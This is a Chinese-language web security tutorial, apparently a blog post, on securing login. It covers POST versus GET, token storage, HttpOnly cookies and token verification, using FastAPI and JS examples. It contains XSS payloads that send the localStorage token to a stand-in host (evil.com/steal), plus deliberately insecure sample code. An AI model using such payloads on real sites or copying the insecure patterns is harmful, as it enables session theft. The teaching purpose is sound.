# 🛡️ 你只是在寫登入、上傳圖片、查資料，為什麼網站卻被攻擊了？

---

## ✍️ 前言

你寫了一個登入頁，一個商品後台，一個查圖片的功能，感覺都沒什麼問題。
但你打開 F12，駭客也打開了；你按下登入，他也跟著打了 API。
你甚至還沒發現你用的圖床爆流量、API 被打爆、帳號被盜光。

這篇文章不講抽象名詞，只從你會做的 3 個操作出發：
**登入、上傳商品、查圖片。**
用一個一個你會寫的功能，帶你看駭客會怎麼攻擊，而你又該怎麼防守。
全篇包含攻防故事、F12 圖解、完整 JS + Python 程式碼、與每層防守實作建議。
看完這篇，即使你不是資安專家，也能寫出不容易被打爆的網站。

---

## 🧭 大綱 

### 1️⃣ 登入（Login）

* 帳密怎麼送才安全？GET / POST / HTTPS
* token 要存哪裡才不會被偷？
* console / XSS 怎麼偷走 token？HttpOnly 能不能擋？
* 登出後還能打 API？token 沒驗證就是漏洞
* 各種儲存方式（localStorage、sessionStorage、cookie）生命週期與風險

---

### 2️⃣ 新建商品（Create Product）

* 表單驗證寫在前端？console 直接造假送出
* 功能按鈕隱藏起來沒用，DevTools 一秒執行
* 商品說明可輸入 script？XSS 攻擊示範
* 上傳圖片不處理，能被惡意檔案搞崩？
* API token 如果寫在前端會怎樣？打爆後直接破產

---

### 3️⃣ 查詢圖片 / 查資料（View Resource）

* API 沒做身份驗證，誰都能看誰的圖片？
* 圖片連結是明碼？爬蟲一輪就被扒光
* 回傳資料太多，把 storage key、user email 全送出？
* 你知道哪些資料算機敏資訊嗎？

---

### 📎 補充篇（視情況加在每章末或集中放文末）

* localStorage vs sessionStorage vs cookie vs HttpOnly 對照表
* JWT、token 過期、撤銷與刷新機制概念
* F12/console 可以看見什麼、做什麼、怎麼偷？
* 什麼叫「機敏資料」？前端回傳應該遮掉什麼欄位？
* 圖床安全：URL 簽名、proxy、後端 relay 設計
 
---

# 1️⃣ 登入（Login）

你寫了一個登入頁，使用者輸入帳密按下「登入」，發出一個請求到後端，拿到 token，然後開始串接後台功能。

看起來一切正常。
但從你打開 F12 的那一刻，駭客也跟著開始行動了。

要讓請求安全的核心思想是：
* 登入後的請求，都要經過token驗證

1. 請求的機敏內容不要顯示在網址列
2. 請求時要帶驗證過的token，並在後端驗證是驗證過的無誤
3. 驗證過的token算機敏資料，要存放在安全的地方。
4. token 應該要有時效性
5. 請求的機敏內容不要讓 JS 讀到（瀏覽器中的console）


---

## 🔻 1.1 你會怎麼寫登入功能？

前端程式碼（不安全範例）：

```js
// ❌ 用 GET 傳帳密
fetch("https://example.com/login?username=alice&password=123456")
  .then((res) => res.json())
  .then(console.log);
```

後端程式碼（Python + FastAPI）：

```python
@app.get("/login")
def login(username: str, password: str):
    if username == "alice" and password == "123456":
        return {"token": "my-secret-token"}
    return {"error": "Invalid credentials"}
```

你拿到 token 後打算這樣用：

```js
localStorage.setItem("token", "my-secret-token"); // ❌
```

看似簡單，卻留下超多破口。

---

## 🧨 1.2 駭客怎麼打你？（攻防起手式）

### 攻擊 1：F12 → Network → 看得到帳密

當你用 GET 傳帳密時，URL 會像這樣：

```
GET /login?username=alice&password=123456
```

任何人打開 F12 → Network → 點該請求，就能看到：

* Request URL（含帳密）
* Query String Parameters（帳密分開顯示）

這些帳密可能會：

* 被記錄在 browser history
* 被 proxy/server log 紀錄
* 被惡意工具擷取

🔴 **只要有人能看你的電腦畫面，帳密就暴露了。**

✅ 解法：請求應使用 `POST`，並配合 `HTTPS` 傳輸，帳密改放在 request body，不再出現在 URL。

---

### 攻擊 2：你放在 localStorage 的 token，他也能偷

你以為 token 存在 localStorage 就萬無一失？其實：

```js
// 只要開 F12、在 console 輸入：
fetch("https://evil.com/steal", {
  method: "POST",
  body: localStorage.getItem("token")
});
```

這就是 Self-XSS：駭客可以誘導你「貼上某段程式碼」，你就把 token 傳給他了。

但還有更恐怖的：

```html
<!-- 假設你有留言欄，攻擊者輸入這段內容： -->
<script>
  fetch("https://evil.com/steal", {
    method: "POST",
    body: localStorage.getItem("token")
  });
</script>
```

如果你沒 escape 這段 HTML，然後用 innerHTML 顯示留言：

```js
document.getElementById("comments").innerHTML = comment.content; // ❌
```

所有打開頁面的人，token 就自動被偷了。這就是 Stored XSS（儲存型跨站攻擊）。

| 類型         | 發動方式                   | 被害對象 | 危險程度    |
| ---------- | ---------------------- | ---- | ------- |
| Self-XSS   | 使用者自己貼入 console        | 自己   | 中（需誘導）  |
| Stored XSS | 攻擊者輸入 `<script>` 存入資料庫 | 所有訪客 | 高（自動觸發） |

✅ 解法：

* 使用 HttpOnly cookie，讓 JS 讀不到 token
* 所有 user input 顯示前必須 escape（或用 textContent）
* 前端禁用 innerHTML 插入 user content

---

## ✅ 1.3 你該怎麼防守？第一步是改寫請求方式

### 改用 POST 傳帳密 + HTTPS 加密

```js
await fetch("https://example.com/login", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({ username: "alice", password: "123456" }),
});
```

後端（FastAPI）：

```python
class LoginRequest(BaseModel):
    username: str
    password: str

@app.post("/login")
def login(data: LoginRequest):
    return {"token": create_jwt_token(data.username)}
```

🔐 使用 `HTTPS` + `POST`，帳密從 URL 隱藏 → body 傳送 → 加密傳輸 → 不留痕跡。

---

## 🧱 1.4 升級防守：token 要存哪裡才安全？

| 儲存方式             | JS 可讀？ | 關掉分頁會消失？ | 關掉瀏覽器會消失？ | 風險                     |
| ---------------- | ------ | -------- | --------- | ---------------------- |
| `localStorage`   | ✅      | ❌        | ❌         | XSS, console 可偷        |
| `sessionStorage` | ✅      | ✅        | ✅         | 易丟失，仍可被偷               |
| Cookie           | ✅      | ❌        | ❌（可設）     | 易被 JS 抓到（除非設 HttpOnly） |
| HttpOnly Cookie  | ❌      | ❌        | ❌（可設）     | ✅ JS 無法讀，推薦用法          |

✅ 結論：使用 **HttpOnly Cookie** 搭配 `secure + samesite=strict` 為最佳實務。

---

## 🧰 1.5 建議做法：使用 HttpOnly Cookie 儲存登入狀態

後端（FastAPI）：

```python
@app.post("/login")
def login(data: LoginRequest, response: Response):
    token = create_jwt_token(data.username)
    response.set_cookie(
        key="access_token",
        value=token,
        httponly=True, # ✅ JavaScript 無法讀取
        samesite="Strict", # ✅ 防禦 CSRF
        secure=True,  # ✅ 僅在 HTTPS 下傳輸 (開發時若無 HTTPS 可先 False)
        max_age=3600,  # cookie 有效期
    )
    return {"msg": "登入成功"}
```

前端只要：

```js
fetch("/api/user", {
  method: "GET",
  credentials: "include",
});
```

---

## 🧨 1.6 駭客第二波攻擊：登入後不驗證 token，一樣能打 API

情境：

* 使用者登入後拿到 token
* F12 → Network → 複製完整 request
* 登出、換裝置、無痕視窗、Postman 貼上就能重送請求

若後端沒驗證 token（沒檢查是否存在、是否過期、是否為本人），
**這些請求照樣通過。**

---

## ✅ 1.7 每個 API 都要驗證身份

後端需針對每筆 request 驗證身份：

```python
from fastapi import Request, HTTPException, Depends

def get_current_user(request: Request):
    token = request.cookies.get("access_token")
    if not token:
        raise HTTPException(status_code=401)
    return decode_jwt(token)
```

應用：

```python
@app.get("/me")
def get_profile(user=Depends(get_current_user)):
    return {"username": user.username}
```

---

## ✅ 小結：登入操作中你可能會犯的資安錯誤

| 錯誤做法                 | 後果        | 修正方式              |
| -------------------- | --------- | ----------------- |
| GET 傳帳密              | 被偷光       | 改 POST + HTTPS    |
| token 存 localStorage | 被偷 + 永不過期 | 改 HttpOnly cookie |
| 不驗證 API token        | 登出也能操作    | 每次請求都驗證 token     |
| token 無過期機制          | 被偷後永久可用   | 加上 JWT 過期與撤銷      |

---

✅ 下一章我們將進入第二個操作：「新建商品」，你將看到怎樣一個 DevTools 就能讓任何使用者假裝自己是管理員上傳資料，並透過 XSS 攻擊整個網站。
